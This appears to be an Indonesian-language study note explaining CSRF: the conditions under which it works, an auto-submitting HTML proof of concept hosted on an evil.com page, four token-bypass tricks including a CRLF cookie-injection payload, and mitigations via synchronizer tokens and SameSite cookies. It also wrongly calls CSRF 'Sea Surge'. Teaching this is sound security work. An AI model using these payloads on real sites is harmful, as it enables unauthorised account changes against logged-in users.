# 🔄 Cross-Site Request Forgery (CSRF)

## 1. Definisi
**Cross-Site Request Forgery (CSRF)** (juga dikenal sebagai *XSRF* atau *Sea Surge*) adalah kerentanan keamanan web di mana penyerang menjebak pengguna terautentikasi (yang sedang login) untuk melakukan tindakan tidak sah yang tidak mereka sadari (seperti mengubah email akun, password, melakukan transfer dana, dll.).

---

## 2. Kondisi Terjadinya CSRF
Serangan CSRF hanya dapat berhasil jika **tiga kondisi utama** berikut terpenuhi:
1. **Terdapat Aksi Relevan**: Fitur atau endpoint yang melakukan perubahan data penting (misalnya mengganti email, mentransfer uang, mengubah hak akses).
2. **Session Handling Berbasis Cookie**: Aplikasi mengandalkan cookie sesi (*session cookie*) untuk mengidentifikasi pengguna, dan browser secara otomatis menyertakan cookie tersebut pada setiap request ke domain target (bahkan saat request dipicu dari situs luar).
3. **Parameter Dapat Diprediksi**: Request tidak memiliki parameter acak yang tidak dapat ditebak oleh penyerang (seperti token keamanan). Jika penyerang dapat menebak seluruh parameter request (misalnya hanya parameter `email` dan `submit`), penyerang dapat merekayasa payload-nya.

---

## 3. Skenario PoC (Proof of Concept) Dasar

Jika sebuah aplikasi rentan terhadap CSRF (misalnya fitur ganti email menggunakan POST ke `/email/change` tanpa token), penyerang dapat membuat halaman HTML jahat dan menghostingnya di server luar:

```html
<!-- CSRF PoC - Disimpan di server penyerang (http://evil.com/csrf.html) -->
<html>
  <body>
    <h1>Selamat! Anda memenangkan hadiah utama!</h1>
    <form action="https://vulnerable-website.com/email/change" method="POST" id="csrfForm">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      // Kirim form secara otomatis saat korban membuka halaman ini
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```

Begitu korban (yang sedang aktif login di `vulnerable-website.com`) mengeklik tautan `http://evil.com/csrf.html`, browser korban akan mengirimkan request POST ganti email lengkap dengan cookie sesi korban yang valid, sehingga email korban berhasil diubah oleh penyerang.

---

## 4. Teknik Pengujian & Bypass (Burp Suite Tips)

### 🕵️ Cara Cepat Membuat PoC di Burp Suite:
1. Klik kanan pada HTTP request yang ingin diuji (pada Burp Suite Professional).
2. Pilih **Engagement Tools** -> **Generate CSRF PoC**.
3. Burp akan secara otomatis menyusun kode HTML PoC. Anda dapat menyalinnya untuk diuji di browser.

### 🛡️ Metode Bypass Validasi CSRF yang Sering Terjadi:

#### Bypass 1: Mengubah Metode HTTP (POST ➡️ GET)
Beberapa framework memvalidasi token CSRF hanya jika request menggunakan metode `POST`. Jika metode diubah menjadi `GET`, validasi dilewati.
* **Trik**: Ubah method form HTML menjadi `GET` dan letakkan parameter di URL.
  ```html
  <form method="GET" action="https://target.com/email/change?email=hack@evil.com">
  ```

#### Bypass 2: Menghapus Parameter Token CSRF
Sering kali aplikasi memvalidasi token CSRF jika parameter tersebut *ada*. Namun, jika parameter token tersebut dihapus secara total dari request body, validasi backend mengasumsikan tidak ada token dan membiarkannya lolos.
* **Trik**: Hapus parameter `csrf` dari form HTML PoC Anda.

#### Bypass 3: Token Tidak Terikat dengan Sesi Pengguna (Session Unbound)
Aplikasi memvalidasi keaslian token CSRF, tetapi tidak memverifikasi apakah token tersebut milik pengguna yang sedang login.
* **Trik**: Masukkan token valid milik akun penyerang ke dalam payload PoC untuk menyerang akun korban.

#### Bypass 4: Token Hanya Diduplikasi pada Cookie (Double Submit Cookie)
Aplikasi hanya mencocokkan apakah nilai token pada request body sama dengan nilai token pada cookie. 
* **Trik**: Jika penyerang dapat melakukan injeksi cookie (misalnya via kerentanan CRLF atau XSS di subdomain lain), penyerang dapat menyetel cookie CSRF palsu miliknya sendiri pada browser korban, lalu mengirimkan parameter token yang sama di body request.
  ```html
  <!-- Contoh Payload memanfaatkan CRLF/Cookie Injection -->
  <img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake_token" onerror="document.forms[0].submit()">
  ```

---

## 5. Mitigasi (Pencegahan)

### ✔️ 1. Menggunakan Anti-CSRF Token (Synchronizer Token Pattern)
Cara paling aman adalah menyertakan token acak unik (entropi tinggi) yang dibuat di sisi server dan dimasukkan ke dalam setiap form/request sensitif. Server harus memvalidasi token ini dengan membandingkannya terhadap token yang disimpan di sesi server pengguna sebelum mengeksekusi aksi.
* Token harus tidak dapat ditebak dan diganti secara berkala (*session-bound*).

### ✔️ 2. Menerapkan Atribut SameSite pada Cookie
Gunakan atribut `SameSite` pada cookie sesi untuk membatasi pengiriman cookie pada request lintas situs (*cross-site*):
* **`SameSite=Strict`**: Cookie tidak akan pernah dikirimkan pada request lintas situs (sangat aman, namun dapat mengganggu UX jika pengguna mengeklik link eksternal ke situs Anda).
* **`SameSite=Lax` (Rekomendasi)**: Cookie hanya akan dikirimkan pada navigasi GET level atas (seperti mengeklik link biasa), dan tidak akan disertakan pada request POST atau request dari pihak ketiga (seperti `<iframe>` atau `<img>`).
* **Contoh**:
  ```http
  Set-Cookie: session=abc123xxx; Secure; HttpOnly; SameSite=Lax
  ```

---

## 6. Referensi Terpercaya
* [PortSwigger Web Security Academy: CSRF Guide](https://portswigger.net/web-security/csrf)
* [OWASP Cheat Sheet Series: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [Top 25 CSRF Bug Bounty Reports by Medium](https://corneacristian.medium.com/top-25-csrf-bug-bounty-reports-ffb0b61afa55)
